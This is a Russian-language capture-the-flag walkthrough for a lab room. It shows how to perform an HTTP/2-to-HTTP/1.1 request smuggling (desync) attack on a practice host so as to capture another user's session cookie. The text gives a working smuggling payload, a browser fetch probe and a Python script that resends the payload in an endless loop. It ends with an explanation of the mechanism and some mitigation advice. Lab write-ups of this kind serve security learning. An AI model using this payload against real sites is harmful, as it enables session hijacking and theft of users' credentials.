# H2→H1 Request Smuggling (El Bandito)


Цель занятия
Получить доступ к веб-приложению, используя добытые учётные данные, и посредством атаки десинхронизации (H2→H1 Desync) перехватить сессионные cookie другого пользователя, чтобы получить флаг.

Предварительные условия
Наличие доступа к целевой машине (IP-адрес известен).
Возможность редактировать файл /etc/hosts для корректного разрешения доменного имени.
Установленный Burp Suite (или другой прокси-инструмент) для перехвата и модификации запросов.
Базовое понимание HTTP/1.1 и HTTP/2, заголовков Content-Length и Transfer-Encoding.

Шаг 1. Настройка разрешения имён
Целевой сервер ожидает запросы на определённое доменное имя (например, challenge.thm), а не по IP-адресу. Добавьте соответствующую запись в файл /etc/hosts:
text
sudo echo "10.114.181.244 challenge.thm" >> /etc/hosts
Проверьте доступность:
text
curl -v http://challenge.thm/login
Если сервер отвечает с кодом 200 или 302, настройка выполнена корректно. В противном случае проверьте порт (возможно, используется нестандартный порт, например 1337, 8000 и т.д.).

Шаг 2. Получение учётных данных
Обычно креды можно найти через уязвимость LFI (Local File Inclusion) по пути /admin-creds или через другой вектор, предоставленный в задании. Например, если приложение уязвимо к LFI, можно прочитать файл с паролями.
Пример запроса:
text
GET /admin-creds HTTP/1.1
Host: challenge.thm
В ответе будут содержаться логин и пароль администратора (или пользователя). Сохраните эти данные.

Шаг 3. Вход в веб-приложение
Откройте страницу входа: http://challenge.thm/login. Используйте полученные креды для входа. После успешной аутентификации вы попадёте на главную страницу, где, скорее всего, будет чат или аналогичный функционал, позволяющий отправлять и получать сообщения.
Изучите интерфейс. В коде страницы (например, в JavaScript-файле messages.js) можно обнаружить функции:
send_message() – отправка сообщения (POST-запрос на /send_message).
getMessages() – получение всех сообщений (GET-запрос на /getMessages).
Также приложение использует HTTP/2, но бэкенд работает по HTTP/1.1, что открывает возможность для десинхронизации.

Шаг 4. Обнаружение уязвимого эндпоинта
Анализ функционала показывает, что существует эндпоинт /save, который принимает POST-запросы. Этот эндпоинт оказывается уязвимым для десинхронизации, так как его обработка позволяет внедрить второй запрос в тело первого.
Проверить уязвимость можно, отправив тестовый POST-запрос с помощью fetch в консоли браузера:
javascript
fetch('http://challenge.thm/save', {
    method: 'POST',
    body: 'GET /redirect HTTP/1.1\r\nFoo: x',
    mode: 'cors',
})
Если после этого обновить страницу и получить ошибку 404 (или неожиданный ответ), значит, десинхронизация работает.

Шаг 5. Создание эксплойта для H2→H1 Desync
Цель: внедрить POST-запрос к /send_message с большим Content-Length, чтобы последующие запросы других пользователей попадали в тело этого запроса и перехватывались.
Сформируйте следующий запрос в Burp Repeater (обязательно убедитесь, что протокол указан как HTTP/2):
text
POST /save HTTP/2
Host: challenge.thm
Cookie: session=<ваша_сессионная_cookie>
Content-Length: 0

POST /send_message HTTP/1.1
Host: challenge.thm
Cookie: session=<ваша_сессионная_cookie>
Content-Type: application/x-www-form-urlencoded
Content-Length: 900

data=
Объяснение:
Внешний запрос (HTTP/2) направлен на /save с Content-Length: 0.
После пустой строки следует второй запрос (HTTP/1.1), который мы хотим внедрить. Он идёт на /send_message и имеет Content-Length: 900.
Фронтенд (HTTP/2) не обращает внимания на содержимое тела, но при передаче на бэкенд (HTTP/1.1) второй запрос будет интерпретирован как отдельный.
Значение 900 выбрано с запасом, чтобы в будущем перехваченные данные от других пользователей поместились в параметр data=.
В случае необходимости размер можно увеличить (например, до 2000).
Важно: В Burp Repeater необходимо отключить автоматическое обновление Content-Length, чтобы Burp не перезаписал наше значение 0.

Шаг 6. Циклическая отправка эксплойта
Для перехвата запросов других пользователей необходимо отправлять этот payload регулярно, например, каждые 5–10 секунд. Это можно сделать вручную через Burp Intruder или с помощью скрипта (например, на Python с использованием библиотеки requests).
Цикл отправки должен быть запущен в фоновом режиме, пока вы продолжаете взаимодействовать с приложением.

Шаг 7. Перехват ответа /getMessages
Через 1–2 минуты после начала отправки эксплойта обновите страницу чата (или выполните GET-запрос к /getMessages). В Burp Suite настройте перехват ответа на этот запрос:
В Burp Proxy перейдите на вкладку Intercept.
Отправьте запрос к /getMessages, на вкладке Intercept нажмите правой кнопкой на запросе и выберите "Do intercept" → "Response to this request".
Перехватите ответ сервера.
В теле ответа (скорее всего, в формате JSON) вы увидите массив сообщений. Одно из сообщений будет содержать внедрённое вами сообщение, но в поле data будет находиться перехваченный запрос другого пользователя (например, POST /login с его куками). Эти куки и являются искомым флагом (или могут быть использованы для входа под другим пользователем).

Шаг 8. Получение флага
Скопируйте значение куки из перехваченного запроса. Оно будет иметь вид:
text
session=<значение>
Это значение представляет собой флаг комнаты. В некоторых случаях флаг может быть просто строкой внутри сообщения.
Пример флага: THM{REDACTED}.

Шаг 9. Альтернативный способ: использование скрипта автоматизации
Для удобства можно написать небольшой Python-скрипт, который отправляет payload в бесконечном цикле:
python
import requests
import time

url = "http://challenge.thm/save"
headers = {
    "Host": "challenge.thm",
    "Cookie": "session=<ваша_кука>"
}
payload = """POST /send_message HTTP/1.1
Host: challenge.thm
Cookie: session=<ваша_кука>
Content-Type: application/x-www-form-urlencoded
Content-Length: 900

data="""

while True:
    requests.post(url, headers=headers, data=payload, verify=False)
    time.sleep(5)
Запустите скрипт в фоновом режиме, затем вручную обновите страницу и перехватите ответ /getMessages.

Объяснение принципа работы атаки
HTTP/2 на фронтенде – запросы приходят в бинарном формате, где границы чётко определены.
Понижение до HTTP/1.1 – прокси (или балансировщик) преобразует HTTP/2 в HTTP/1.1 для бэкенда. При этом заголовки и тело переносятся как есть.
Десинхронизация – поскольку HTTP/2 игнорирует Content-Length во внешнем запросе, но бэкенд видит только HTTP/1.1 и воспринимает Content-Length как указатель на границу тела, можно внедрить второй запрос в тело первого.
Подмена запроса – бэкенд, получив внедрённый запрос, помещает его в очередь соединения. Когда другой пользователь делает запрос, он «приклеивается» к нашему внедрённому запросу, и мы видим его данные.

Выводы
Атака H2→H1 Desync позволяет перехватывать запросы других пользователей, находящихся в том же соединении с бэкендом.
Для успеха необходимо наличие уязвимого эндпоинта (в данном случае /save), который не проверяет тело запроса и не очищает входные данные.
Важно правильно подобрать Content-Length в внедрённом запросе, чтобы он был достаточно большим для захвата чужих данных.
Полученные куки могут быть использованы для принудительного входа под учётной записью другого пользователя.
Эта техника демонстрирует критичность настройки прокси и серверов при использовании HTTP/2 и HTTP/1.1 совместно. Регулярное обновление серверного ПО и отказ от поддержки конвейерной обработки запросов могут снизить риск подобных атак.
